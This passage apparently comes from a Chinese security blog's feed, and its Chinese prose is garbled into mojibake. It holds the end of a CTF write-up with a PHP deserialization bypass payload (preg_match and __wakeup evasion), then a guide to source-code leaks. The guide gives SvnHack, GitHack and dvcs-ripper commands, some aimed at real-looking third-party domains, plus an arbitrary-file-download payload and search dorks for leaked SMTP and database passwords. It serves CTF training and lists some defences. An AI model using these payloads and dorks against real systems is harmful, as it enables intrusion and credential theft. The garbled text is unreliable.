rel="noopener">https://adworld.xctf.org.cn/task/answer?type=web&amp;number=3&amp;grade=1&amp;id=5409&amp;page=1</a><br>æ‰“å¼€é¢˜ç›®æ˜¯æºä»£ç ï¼š</p><pre><code>&lt;?php class Demo {     private $file = &#39;index.php&#39;;    public function __construct($file) {         $this-&gt;file = $file;     }    function __destruct() {         echo @highlight_file($this-&gt;file, true);     }    function __wakeup() {         if ($this-&gt;file != &#39;index.php&#39;) {             //the secret is in the fl4g.php            $this-&gt;file = &#39;index.php&#39;;         }     } }if (isset($_GET[&#39;var&#39;])) {     $var = base64_decode($_GET[&#39;var&#39;]);     if (preg_match(&#39;/[oc]:\d+:/i&#39;, $var)) {         die(&#39;stop hacking!&#39;);     } else {        @unserialize($var);     } } else {     highlight_file(&quot;index.php&quot;); } ?&gt;</code></pre><p><img src="/images/pasted-82.png" alt="upload successful"><br>æ‰€ä»¥æ„é€ payloadæ¥è¿›è¡Œç»•è¿‡ï¼š</p><pre><code>&lt;?php class Demo {     private $file = &#39;fl4g.php&#39;;}$x= serialize(new Demo);$x=str_replace(&#39;O:4&#39;, &#39;O:+4&#39;,$x);//ç»•è¿‡preg_match()$x=str_replace(&#39;:1:&#39;, &#39;:3:&#39;,$x);//ç»•è¿‡__wakeup()echo base64_encode($x);?&gt;</code></pre><p><code>TzorNDoiRGVtbyI6Mzp7czoxMDoiAERlbW8AZmlsZSI7czo4OiJmbDRnLnBocCI7fQ==</code><br>varä¼ å…¥å³å¯è·å¾—flag<br>å¦‚æœè¿™é‡Œæ²¡æœ‰base64åŠ å¯†ï¼Œæˆ‘ä¹ˆä¹Ÿéœ€è¦è¿›è¡Œurlç¼–ç ï¼Œå› ä¸ºdemoä¸­privateä¸ºç§æœ‰å±æ€§ï¼Œååºåˆ—åŒ–ä¼šå‡ºç°ä¸å¯è§å­—ç¬¦ï¼Œæ‰€ä»¥è¦è¿›è¡Œurlç¼–ç </p><p><img src="/images/pasted-83.png" alt="upload successful"></p><h2 id="å¦‚ä½•é˜²æ­¢phpååºåˆ—åŒ–"><a href="#å¦‚ä½•é˜²æ­¢phpååºåˆ—åŒ–" class="headerlink" title="å¦‚ä½•é˜²æ­¢phpååºåˆ—åŒ–"></a>å¦‚ä½•é˜²æ­¢phpååºåˆ—åŒ–</h2><ol><li>å°½é‡ä¸è¦ç”¨åºåˆ—åŒ–æ¥ä¼ è¾“æ•°æ®</li><li>ä¸è¦ç›¸ä¿¡ç”¨æˆ·ä¼ å…¥æ•°æ®ï¼Œæˆ–è€…ä¸è®©ç”¨æˆ·ä¼ å…¥å®Œæ•´çš„åºåˆ—åŒ–ç±»å‹ï¼Œè¿›è¡Œè¿‡æ»¤</li><li>éš”ç¦»è¿è¡Œåœ¨ä½æƒé™ç¯å¢ƒä¸­çš„ååºåˆ—åŒ–ï¼Œè®°å½•ååºåˆ—åŒ–å¼‚å¸¸å’Œå¤±è´¥ï¼Œä¾‹å¦‚ä¼ å…¥ç±»å‹ä¸æ˜¯é¢„æœŸç±»å‹ï¼Œæˆ–è€…ååºåˆ—åŒ–å¼•å‘å¼‚å¸¸ï¼Œé™åˆ¶æˆ–ç›‘è§†æ¥è‡ªååºåˆ—åŒ–çš„å®¹å™¨æˆ–æœåŠ¡å™¨çš„ä¼ å…¥å’Œä¼ å‡ºç½‘ç»œè¿æ¥ï¼Œé™åˆ¶æˆ–ç›‘è§†æ¥è‡ªååºåˆ—åŒ–çš„å®¹å™¨æˆ–æœåŠ¡å™¨çš„ä¼ å…¥å’Œä¼ å‡ºç½‘ç»œè¿æ¥ã€‚ç›‘è§†ååºåˆ—åŒ–ï¼Œå¦‚æœç”¨æˆ·ä¸æ–­åœ°ååºåˆ—åŒ–ï¼Œåˆ™å‘å‡ºè­¦æŠ¥ã€‚<h2 id="å‚è€ƒæ–‡ç« åŠè¯´æ˜"><a href="#å‚è€ƒæ–‡ç« åŠè¯´æ˜" class="headerlink" title="å‚è€ƒæ–‡ç« åŠè¯´æ˜"></a>å‚è€ƒæ–‡ç« åŠè¯´æ˜</h2>å‚è€ƒæ–‡ç« :<br><a href="https://blog.csdn.net/qq_45521281/article/details/107135706" target="_blank" rel="noopener">https://blog.csdn.net/qq_45521281/article/details/107135706</a><br><a href="https://paper.seebug.org/680/" target="_blank" rel="noopener">https://paper.seebug.org/680/</a><br><a href="https://xz.aliyun.com/t/7366#toc-6" target="_blank" rel="noopener">https://xz.aliyun.com/t/7366#toc-6</a><br>ã€Šä»ä»0åˆ°1 ctferçš„æˆé•¿ä¹‹è·¯ã€‹<br>è¯´æ˜ï¼šæœ¬æ–‡ä»…é™æŠ€æœ¯ç ”ç©¶ä¸è®¨è®ºï¼Œä¸¥ç¦ç”¨äºéæ³•ç”¨é€”ï¼Œå¦åˆ™äº§ç”Ÿçš„ä¸€åˆ‡åæœè‡ªè¡Œæ‰¿æ‹…</li></ol>]]></content>
      
      
      <categories>
          
          <category> webå®‰å…¨ </category>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> phpååºåˆ—åŒ– </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>CTFå¸¸è§æºç æ³„éœ²</title>
      <link href="/posts/d545.html"/>
      <url>/posts/d545.html</url>
      
        <content type="html"><![CDATA[<h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>åœ¨ctfä¸­å‘ç°å¾ˆå¤šæºç æ³„éœ²çš„é¢˜ï¼Œæ€»ç»“ä¸€ä¸‹ï¼Œå¯¹äºç½‘ç«™çš„æ­å»ºè¦æ³¨æ„åˆ é™¤å¤‡ä»½æ–‡ä»¶ï¼Œå’Œä¸€äº›å·¥å…·çš„ä½¿ç”¨å¦‚gitï¼Œsvnç­‰ç­‰çš„è§„èŒƒä½¿ç”¨ï¼Œé¿å…å¤‡ä»½æ–‡ä»¶å‡ºç°åœ¨å…¬ç½‘</p><h2 id="SVNæºç æ³„éœ²"><a href="#SVNæºç æ³„éœ²" class="headerlink" title="SVNæºç æ³„éœ²"></a>SVNæºç æ³„éœ²</h2><h3 id="åŸç†"><a href="#åŸç†" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>SVNï¼ˆsubversionï¼‰æ˜¯æºä»£ç ç‰ˆæœ¬ç®¡ç†è½¯ä»¶ï¼Œé€ æˆSVNæºä»£ç æ¼æ´çš„ä¸»è¦åŸå› æ˜¯ç®¡ç†å‘˜æ“ä½œä¸è§„èŒƒã€‚â€œåœ¨ä½¿ç”¨SVNç®¡ç†æœ¬åœ°ä»£ç è¿‡ç¨‹ä¸­ï¼Œä¼šè‡ªåŠ¨ç”Ÿæˆä¸€ä¸ªåä¸º.svnçš„éšè—æ–‡ä»¶å¤¹ï¼Œå…¶ä¸­åŒ…å«é‡è¦çš„æºä»£ç ä¿¡æ¯ã€‚ä½†ä¸€äº›ç½‘ç«™ç®¡ç†å‘˜åœ¨å‘å¸ƒä»£ç æ—¶ï¼Œä¸æ„¿æ„ä½¿ç”¨â€˜å¯¼å‡ºâ€™åŠŸèƒ½ï¼Œè€Œæ˜¯ç›´æ¥å¤åˆ¶ä»£ç æ–‡ä»¶å¤¹åˆ°WEBæœåŠ¡å™¨ä¸Šï¼Œè¿™å°±ä½¿.svnéšè—æ–‡ä»¶å¤¹è¢«æš´éœ²äºå¤–ç½‘ç¯å¢ƒï¼Œé»‘å®¢å¯ä»¥å€ŸåŠ©å…¶ä¸­åŒ…å«çš„ç”¨äºç‰ˆæœ¬ä¿¡æ¯è¿½è¸ªçš„â€˜entriesâ€™æ–‡ä»¶ï¼Œé€æ­¥æ‘¸æ¸…ç«™ç‚¹ç»“æ„ã€‚â€ï¼ˆå¯ä»¥åˆ©ç”¨.svn/entriesæ–‡ä»¶ï¼Œè·å–åˆ°æœåŠ¡å™¨æºç ã€svnæœåŠ¡å™¨è´¦å·å¯†ç ç­‰ä¿¡æ¯ï¼‰</p><p>   æ›´ä¸¥é‡çš„é—®é¢˜åœ¨äºï¼ŒSVNäº§ç”Ÿçš„.svnç›®å½•ä¸‹è¿˜åŒ…å«äº†ä»¥.svn-baseç»“å°¾çš„æºä»£ç æ–‡ä»¶å‰¯æœ¬ï¼ˆä½ç‰ˆæœ¬SVNå…·ä½“è·¯å¾„ä¸ºtext-baseç›®å½•ï¼Œé«˜ç‰ˆæœ¬SVNä¸ºpristineç›®å½•ï¼‰ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰å¯¹æ­¤ç±»åç¼€åšè§£æï¼Œé»‘å®¢åˆ™å¯ä»¥ç›´æ¥è·å¾—æ–‡ä»¶æºä»£ç ã€‚</p><h3 id="åˆ©ç”¨å·¥å…·SvnHack"><a href="#åˆ©ç”¨å·¥å…·SvnHack" class="headerlink" title="åˆ©ç”¨å·¥å…·SvnHack"></a>åˆ©ç”¨å·¥å…·SvnHack</h3><p>githubé¡¹ç›®åœ°å€:<a href="https://github.com/callmefeifei/SvnHack" target="_blank" rel="noopener">https://github.com/callmefeifei/SvnHack</a><br><strong>ä½¿ç”¨éœ€è¦python2çš„ç¯å¢ƒ</strong><br>åˆ—å–ç›®å½•:</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries</code></pre><p><img src="/images/pasted-3.png" alt="upload successful"><br>åˆ—å–æŒ‡å®šç›®å½•</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries -d sql</code></pre><p>è¯»å–æŒ‡å®šä»£ç </p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries -r index.php</code></pre><p><img src="/images/pasted-4.png" alt="upload successful"><br>ä¸‹è½½æ•´ç«™</p><pre><code>python SvnHack.py -u http://trafficbonus.com/.svn/entries --download</code></pre><p><img src="/images/pasted-5.png" alt="upload successful"></p><h2 id="gitæºç æ³„éœ²"><a href="#gitæºç æ³„éœ²" class="headerlink" title="gitæºç æ³„éœ²"></a>gitæºç æ³„éœ²</h2><h3 id="åŸç†-1"><a href="#åŸç†-1" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>Gitæ˜¯ä¸€ä¸ªå¼€æºçš„åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œåœ¨æ‰§è¡Œgit initåˆå§‹åŒ–ç›®å½•çš„æ—¶å€™ï¼Œä¼šåœ¨å½“å‰ç›®å½•ä¸‹è‡ªåŠ¨åˆ›å»ºä¸€ä¸ª.gitç›®å½•ï¼Œç”¨æ¥è®°å½•ä»£ç çš„å˜æ›´è®°å½•ç­‰ã€‚å‘å¸ƒä»£ç çš„æ—¶å€™ï¼Œå¦‚æœæ²¡æœ‰æŠŠ.gitè¿™ä¸ªç›®å½•åˆ é™¤ï¼Œå°±ç›´æ¥å‘å¸ƒåˆ°äº†æœåŠ¡å™¨ä¸Šï¼Œæ”»å‡»è€…å°±å¯ä»¥é€šè¿‡å®ƒæ¥æ¢å¤æºä»£ç ã€‚</p><h3 id="åˆ©ç”¨githack-éœ€è¦python2ç¯å¢ƒ"><a href="#åˆ©ç”¨githack-éœ€è¦python2ç¯å¢ƒ" class="headerlink" title="åˆ©ç”¨githack(éœ€è¦python2ç¯å¢ƒ)"></a>åˆ©ç”¨githack(éœ€è¦python2ç¯å¢ƒ)</h3><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/lijiejie/GitHack" target="_blank" rel="noopener">https://github.com/lijiejie/GitHack</a></p><pre><code>python GitHack.py http://www.openssl.org/.git/</code></pre><h2 id="hgæºç æ³„éœ²"><a href="#hgæºç æ³„éœ²" class="headerlink" title="hgæºç æ³„éœ²"></a>hgæºç æ³„éœ²</h2><h3 id="åŸç†-2"><a href="#åŸç†-2" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>Mercurial æ˜¯ä¸€ç§è½»é‡çº§åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼Œä½¿ç”¨ hg initçš„æ—¶å€™ä¼šç”Ÿæˆ.hgæ–‡ä»¶</p><h3 id="åˆ©ç”¨éœ€è¦perl"><a href="#åˆ©ç”¨éœ€è¦perl" class="headerlink" title="åˆ©ç”¨éœ€è¦perl"></a>åˆ©ç”¨éœ€è¦perl</h3><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/kost/dvcs-ripper" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper</a><br>ä½¿ç”¨</p><pre><code>perl rip-hg.pl -v -u http://www.example.com/.hg/</code></pre><p><img src="/images/pasted-6.png" alt="upload successful"></p><h2 id="cvsæ¼æ´æ³„éœ²"><a href="#cvsæ¼æ´æ³„éœ²" class="headerlink" title="cvsæ¼æ´æ³„éœ²"></a>cvsæ¼æ´æ³„éœ²</h2><h3 id="åŸç†-3"><a href="#åŸç†-3" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>CVSæ˜¯ä¸€ä¸ªC/Sç³»ç»Ÿï¼Œæ˜¯ä¸€ä¸ªå¸¸ç”¨çš„ä»£ç ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶ã€‚ä¸»è¦åœ¨å¼€æºè½¯ä»¶ç®¡ç†ä¸­ä½¿ç”¨ã€‚ä¸å®ƒç›¸ç±»ä¼¼çš„ä»£ç ç‰ˆæœ¬æ§åˆ¶è½¯ä»¶æœ‰subversionã€‚å¤šä¸ªå¼€å‘äººå‘˜é€šè¿‡ä¸€ä¸ªä¸­å¿ƒç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ¥è®°å½•æ–‡ä»¶ç‰ˆæœ¬ï¼Œä»è€Œè¾¾åˆ°ä¿è¯æ–‡ä»¶åŒæ­¥çš„ç›®çš„ã€‚CVSç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿæ˜¯ä¸€ç§GNUè½¯ä»¶åŒ…ï¼Œä¸»è¦ç”¨äºåœ¨å¤šäººå¼€å‘ç¯å¢ƒä¸‹çš„æºç çš„ç»´æŠ¤ã€‚ä½†æ˜¯ç”±äºä¹‹å‰CVSç¼–ç çš„é—®é¢˜ï¼Œå¤§å¤šæ•°è½¯ä»¶å¼€å‘å…¬å¸éƒ½ä½¿ç”¨SVNæ›¿ä»£äº†CVSã€‚ä¸»è¦æ˜¯é’ˆå¯¹ CVS/Rootä»¥åŠCVS/Entriesç›®å½•ï¼Œç›´æ¥å°±å¯ä»¥çœ‹åˆ°æ³„éœ²çš„ä¿¡æ¯ã€‚<br><a href="http://url/CVS/Root" target="_blank" rel="noopener">http://url/CVS/Root</a> è¿”å›æ ¹ä¿¡æ¯<br><a href="http://url/CVS/Entries" target="_blank" rel="noopener">http://url/CVS/Entries</a> è¿”å›æ‰€æœ‰æ–‡ä»¶çš„ç»“æ„</p><h3 id="åˆ©ç”¨"><a href="#åˆ©ç”¨" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>githubé¡¹ç›®åœ°å€ï¼š<a href="https://github.com/kost/dvcs-ripper.git" target="_blank" rel="noopener">https://github.com/kost/dvcs-ripper.git</a></p><p>è¿è¡Œç¤ºä¾‹:</p><pre><code>perl rip-cvs.pl -v -u http://www.example.com/CVS/</code></pre><h2 id="Bazaar-bzræ³„éœ²"><a href="#Bazaar-bzræ³„éœ²" class="headerlink" title="Bazaar/bzræ³„éœ²"></a>Bazaar/bzræ³„éœ²</h2><h3 id="åŸç†-4"><a href="#åŸç†-4" class="headerlink" title="åŸç†"></a>åŸç†</h3><p>Bazaarï¼ˆbzrï¼‰æ˜¯å¦ä¸€ä¸ªå¼€æºçš„ DVCSï¼ˆDistributed Version Control Systemï¼Œå³åˆ†å¸ƒå¼ç‰ˆæœ¬æ§åˆ¶ç³»ç»Ÿï¼‰ï¼Œå®ƒè¯•å›¾ç»™ SCMï¼ˆSource Code Managementï¼Œå³æºç ç®¡ç†ï¼‰ çš„ä¸–ç•Œé‡Œå¸¦æ¥ä¸€äº›æ–°çš„ä¸œè¥¿ã€‚<br>ã€€ã€€bzr æ˜¯ Canonical å…¬å¸æ”¯æŒçš„ä¸€ä¸ªé¡¹ç›®ï¼Œä¹Ÿå°±æ˜¯ Ubuntu Linux çš„å‘è¡Œå…¬å¸ã€‚ç®€å•æ¥è¯´ï¼Œbzr æ˜¯ç”¨ python ç¼–å†™çš„ï¼Œç”¨äºç‰ˆæœ¬æ§åˆ¶ã€‚</p><h3 id="åˆ©ç”¨-1"><a href="#åˆ©ç”¨-1" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><pre><code>perl rip-bzr.pl -v -u http://www.example.com/.bzr/</code></pre><p><img src="/images/pasted-7.png" alt="upload successful"></p><h2 id="ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"><a href="#ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶" class="headerlink" title="ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶"></a>ç½‘ç«™å¤‡ä»½å‹ç¼©æ–‡ä»¶</h2><p>ç®¡ç†å‘˜å°†ç½‘ç«™æºä»£ç å¤‡ä»½åœ¨Webç›®å½•ä¸‹ï¼Œæ”»å‡»è€…é€šè¿‡çŒœè§£æ–‡ä»¶è·¯å¾„ï¼Œä¸‹è½½å¤‡ä»½æ–‡ä»¶ï¼Œå¯¼è‡´æºä»£ç æ³„éœ²ã€‚</p><h3 id="å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€"><a href="#å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€" class="headerlink" title="å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€"></a>å¸¸è§å¤‡ä»½æ–‡ä»¶åç¼€</h3><pre><code>.index.php.swpindex.php.swpindex.php.bak.index.php~index.php.bak_Edietplusindex.php.~index.php.~1~index.phpindex.php~index.php.rarindex.php.zipindex.php.7zindex.php.tar.gzwww.zipwww.rarwww.zipwww.7zwww.tar.gzwww.tarweb.zipweb.rarweb.zipweb.7zweb.tar.gzweb.tarwwwroot.rarweb.rar</code></pre><h2 id="WEB-INF-web-xml-æ³„éœ²"><a href="#WEB-INF-web-xml-æ³„éœ²" class="headerlink" title="WEB-INF/web.xml æ³„éœ²"></a>WEB-INF/web.xml æ³„éœ²</h2><p>WEB-INFæ˜¯Javaçš„WEBåº”ç”¨çš„å®‰å…¨ç›®å½•ï¼Œå¦‚æœæƒ³åœ¨é¡µé¢ä¸­ç›´æ¥è®¿é—®å…¶ä¸­çš„æ–‡ä»¶ï¼Œå¿…é¡»é€šè¿‡web.xmlæ–‡ä»¶å¯¹è¦è®¿é—®çš„æ–‡ä»¶è¿›è¡Œç›¸åº”æ˜ å°„æ‰èƒ½è®¿é—®ã€‚</p><p>WEB-INF ä¸»è¦åŒ…å«ä¸€ä¸‹æ–‡ä»¶æˆ–ç›®å½•ï¼š</p><pre><code>WEB-INF/web.xml : Webåº”ç”¨ç¨‹åºé…ç½®æ–‡ä»¶, æè¿°äº†servletå’Œå…¶ä»–çš„åº”ç”¨ç»„ä»¶é…ç½®åŠå‘½åè§„åˆ™.WEB-INF/database.properties : æ•°æ®åº“é…ç½®æ–‡ä»¶WEB-INF/classes/ : ä¸€èˆ¬ç”¨æ¥å­˜æ”¾Javaç±»æ–‡ä»¶(.class)WEB-INF/lib/ : ç”¨æ¥å­˜æ”¾æ‰“åŒ…å¥½çš„åº“(.jar)WEB-INF/src/ : ç”¨æ¥æ”¾æºä»£ç (.aspå’Œ.phpç­‰)</code></pre><p>é€šè¿‡æ‰¾åˆ° web.xml æ–‡ä»¶ï¼Œæ¨æ–­ class æ–‡ä»¶çš„è·¯å¾„ï¼Œæœ€åç›´æ¥ class æ–‡ä»¶ï¼Œå†é€šè¿‡åç¼–è¯‘ class æ–‡ä»¶ï¼Œå¾—åˆ°ç½‘ç«™æºç ã€‚</p><h3 id="CTFä¸­WEB-INF-web-xmlæ³„éœ²"><a href="#CTFä¸­WEB-INF-web-xmlæ³„éœ²" class="headerlink" title="CTFä¸­WEB-INF/web.xmlæ³„éœ²"></a>CTFä¸­WEB-INF/web.xmlæ³„éœ²</h3><p>å¹³å°ï¼š<a href="https://buuoj.cn" target="_blank" rel="noopener">https://buuoj.cn</a></p><p><img src="/images/pasted-12.png" alt="upload successful"><br>æ‰“å¼€é¢˜ç›®æ˜¯ä¸€ä¸ªç™»å½•æ¡†</p><p><img src="/images/pasted-13.png" alt="upload successful"><br>æç¤ºæ˜¯javaï¼Œç™»å½•æ¡†è¯•è¯•æ²¡å‘ç°ä»€ä¹ˆï¼Œç‚¹å‡»helpå‘ç°</p><p><img src="/images/pasted-14.png" alt="upload successful"><br>æœ‰ä¸ªdownloadï¼Œæ”¹ä¸ºpostä¼ è¾“å°è¯•ä»»æ„æ–‡ä»¶ä¸‹è½½<br>å…ˆä¼ å…¥WEB-INF/web.xmlçœ‹çœ‹é…ç½®ï¼Œä¸Šé¢è¯´è¿‡äº†</p><p><img src="/images/pasted-15.png" alt="upload successful"><br>å‘ç°ç–‘ä¼¼ä¸€ä¸ªç±»ä¼¼flagçš„ç±»æ–‡ä»¶ï¼Œå°è¯•ä¸‹è½½<br>payloadï¼š</p><pre><code>filename=WEB-INF/classes/com/wm/ctf/FlagController.class</code></pre><p><img src="/images/pasted-16.png" alt="upload successful"></p><p><img src="/images/pasted-17.png" alt="upload successful"><br>ä¸‹è½½ä¸‹æ¥å‘ç°ä¸€ä¸ªç±»ä¼¼çš„base64åŠ å¯†çš„ä¸œè¥¿è§£å¯†çœ‹çœ‹ï¼ŒæˆåŠŸè·å¾—flag</p><p><img src="/images/pasted-18.png" alt="upload successful"></p><h2 id="SWP-æ–‡ä»¶æ³„éœ²"><a href="#SWP-æ–‡ä»¶æ³„éœ²" class="headerlink" title="SWP æ–‡ä»¶æ³„éœ²"></a>SWP æ–‡ä»¶æ³„éœ²</h2><p>swpå³swapæ–‡ä»¶ï¼Œåœ¨ç¼–è¾‘æ–‡ä»¶æ—¶äº§ç”Ÿçš„ä¸´æ—¶æ–‡ä»¶ï¼Œå®ƒæ˜¯éšè—æ–‡ä»¶ï¼Œå¦‚æœç¨‹åºæ­£å¸¸é€€å‡ºï¼Œä¸´æ—¶æ–‡ä»¶è‡ªåŠ¨åˆ é™¤ï¼Œå¦‚æœæ„å¤–é€€å‡ºå°±ä¼šä¿ç•™ï¼Œæ–‡ä»¶åä¸º .filename.swpã€‚</p><p>æ¼æ´åˆ©ç”¨ï¼šç›´æ¥è®¿é—®.swpæ–‡ä»¶ï¼Œä¸‹è½½å›æ¥ååˆ æ‰æœ«å°¾çš„.swpï¼Œè·å¾—æºç æ–‡ä»¶ã€‚</p><h2 id="githubæºç æ³„éœ²"><a href="#githubæºç æ³„éœ²" class="headerlink" title="githubæºç æ³„éœ²"></a>githubæºç æ³„éœ²</h2><p>GitHubæ˜¯ä¸€ä¸ªé¢å‘å¼€æºåŠç§æœ‰è½¯ä»¶é¡¹ç›®çš„æ‰˜ç®¡å¹³å°ï¼Œå¾ˆå¤šäººå–œæ¬¢æŠŠè‡ªå·±çš„ä»£ç ä¸Šä¼ åˆ°å¹³å°æ‰˜ç®¡ã€‚æ”»å‡»è€…é€šè¿‡å…³é”®è¯è¿›è¡Œæœç´¢ï¼Œå¯ä»¥æ‰¾åˆ°å…³äºç›®æ ‡ç«™ç‚¹çš„æ•æ„Ÿä¿¡æ¯ï¼Œç”šè‡³å¯ä»¥ä¸‹è½½ç½‘ç«™æºç ã€‚</p><h3 id="githubå¸¸è§æœç´¢è¯­æ³•"><a href="#githubå¸¸è§æœç´¢è¯­æ³•" class="headerlink" title="githubå¸¸è§æœç´¢è¯­æ³•"></a>githubå¸¸è§æœç´¢è¯­æ³•</h3><pre><code>in:name test               #ä»“åº“æ ‡é¢˜æœç´¢å«æœ‰å…³é”®å­— SpringCloudin:descripton test         #ä»“åº“æè¿°æœç´¢å«æœ‰å…³é”®å­—in:readme test             #Readmeæ–‡ä»¶æœç´ å«æœ‰å…³é”®å­—stars:&gt;3000 test           #starsæ•°é‡å¤§äº3000çš„æœç´¢å…³é”®å­—stars:1000..3000 test      #starsæ•°é‡å¤§äº1000å°äº3000çš„æœç´¢å…³é”®å­—forks:&gt;1000 test           #forksæ•°é‡å¤§äº1000çš„æœç´¢å…³é”®å­—forks:1000..3000 test      #forksæ•°é‡å¤§äº1000å°äº3000çš„æœç´¢å…³é”®å­—size:&gt;=5000 test           #æŒ‡å®šä»“åº“å¤§äº5000k(5M)çš„æœç´¢å…³é”®å­—pushed:&gt;2019-02-12 test    #å‘å¸ƒæ—¶é—´å¤§äº2019-02-12çš„æœç´¢å…³é”®å­—created:&gt;2019-02-12 test   #åˆ›å»ºæ—¶é—´å¤§äº2019-02-12çš„æœç´¢å…³é”®å­—user:test                  #ç”¨æˆ·åæœç´ license:apache-2.0 test    #æ˜ç¡®ä»“åº“çš„ LICENSE æœç´¢å…³é”®å­—language:java test         #åœ¨javaè¯­è¨€çš„ä»£ç ä¸­æœç´¢å…³é”®å­—user:test in:name test     #ç»„åˆæœç´¢,ç”¨æˆ·åtestçš„æ ‡é¢˜å«æœ‰testçš„</code></pre><h3 id="Googleé‚®ç®±æœç´¢"><a href="#Googleé‚®ç®±æœç´¢" class="headerlink" title="Googleé‚®ç®±æœç´¢"></a>Googleé‚®ç®±æœç´¢</h3><p>ä½¿ç”¨ Github è¿›è¡Œé‚®ä»¶é…ç½®ä¿¡æ¯æ”¶é›†</p><p>å¾ˆå¤šç½‘ç«™åŠç³»ç»Ÿéƒ½ä¼šä½¿ç”¨ pop3 å’Œ smtp å‘é€æ¥é‚®ä»¶ï¼Œä¸å°‘å¼€å‘è€…ç”±äºå®‰å…¨æ„è¯†ä¸è¶³ä¼šæŠŠç›¸å…³çš„é…ç½®ä¿¡æ¯ä¹Ÿæ”¾åˆ°Githubä¸Šï¼Œæ‰€ä»¥å¦‚</p><p>æœè¿™æ—¶å€™æˆ‘ä»¬åŠ¨ç”¨ä¸€ä¸‹googleæœç´¢å‘½ä»¤è¯­å¥ï¼Œæ„é€ ä¸€ä¸‹å…³é”®å­—ï¼Œå°±èƒ½æŠŠè¿™äº›ä¿¡æ¯ç»™æ‰¾å‡ºæ¥äº†ã€‚</p><pre><code>site:Github.com smtpsite:Github.com smtp @qq.comsite:Github.com smtp @126.comsite:Github.com smtp @163.comsite:Github.com smtp @sina.com.cnsite:Github.com smtp passwordsite:Github.com String password smtp</code></pre><h3 id="æ•°æ®åº“ä¿¡æ¯æœé›†"><a href="#æ•°æ®åº“ä¿¡æ¯æœé›†" class="headerlink" title="æ•°æ®åº“ä¿¡æ¯æœé›†"></a>æ•°æ®åº“ä¿¡æ¯æœé›†</h3><pre><code>site:Github.com sa passwordsite:Github.com root passwordsite:Github.com User ID=â€™saâ€™;Passwordsite:Github.com inurl:sql</code></pre><h2 id="DS-Storeæ³„éœ²"><a href="#DS-Storeæ³„éœ²" class="headerlink" title=".DS_Storeæ³„éœ²"></a>.DS_Storeæ³„éœ²</h2><p>.DS_Store æ–‡ä»¶åˆ©ç”¨ .DS_Store æ˜¯ Mac OS ä¿å­˜æ–‡ä»¶å¤¹çš„è‡ªå®šä¹‰å±æ€§çš„éšè—æ–‡ä»¶ã€‚é€šè¿‡.DS_Storeå¯ä»¥çŸ¥é“è¿™ä¸ªç›®å½•é‡Œé¢æ‰€æœ‰æ–‡ä»¶çš„æ¸…å•ã€‚###</p><h3 id="åˆ©ç”¨-2"><a href="#åˆ©ç”¨-2" class="headerlink" title="åˆ©ç”¨"></a>åˆ©ç”¨</h3><p>githubé¡¹ç›®åœ°å€:<a href="https://github.com/lijiejie/ds_store_exp" target="_blank" rel="noopener">https://github.com/lijiejie/ds_store_exp</a><br>ä½¿ç”¨ä¸‹è½½åï¼Œè¿›å…¥ç›®å½•æ›´æ–°python2åº“</p><pre><code>pip install -r requirements.txt</code></pre><pre><code>python ds_store_exp.py http://6974-59fce729-40f6-4124-a2c9-a5a66673dc66node3.buuoj.cn:28261/.DS_Store</code></pre><p>buuctfä¸­çš„ä¸€é“é¢˜æ¼”ç¤ºï¼ŒæˆåŠŸæ‹‰å–äº†ç›®å½•</p><p><img src="/images/pasted-8.png" alt="upload successful"></p><p><img src="/images/pasted-9.png" alt="upload successful"></p><h2 id="ä¸€ä¸ªctfç›®å½•æ‰«æå°å·¥å…·"><a href="#ä¸€ä¸ªctfç›®å½•æ‰«æå°å·¥å…·" class="headerlink" title="ä¸€ä¸ªctfç›®å½•æ‰«æå°å·¥å…·"></a>ä¸€ä¸ªctfç›®å½•æ‰«æå°å·¥å…·</h2><p>å½“ç„¶ä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™å­—å…¸ï¼Œç¼–å†™è„šæœ¬ï¼Œæˆ–ç”¨dirsearchï¼Œå¾¡å‰‘ç­‰å·¥å…·æ‰«æï¼Œä¸‹é¢ä»‹ç»ä¸€ä¸ªè‡ªå·±ç”¨çš„ctfç›®å½•æ‰«æ<br>é¡¹ç›®åœ°å€:<a href="https://github.com/kingkaki/ctf-wscan" target="_blank" rel="noopener">https://github.com/kingkaki/ctf-wscan</a></p><h3 id="ä½¿ç”¨"><a href="#ä½¿ç”¨" class="headerlink" title="ä½¿ç”¨"></a>ä½¿ç”¨</h3><p>python3 ctf-wscan.py <a href="http://beed29ec-8f77-4e15-a1d6-c327148dab8e.node3.buuoj.cn/" target="_blank" rel="noopener">http://beed29ec-8f77-4e15-a1d6-c327148dab8e.node3.buuoj.cn/</a></p><p><img src="/images/pasted-10.png" alt="upload 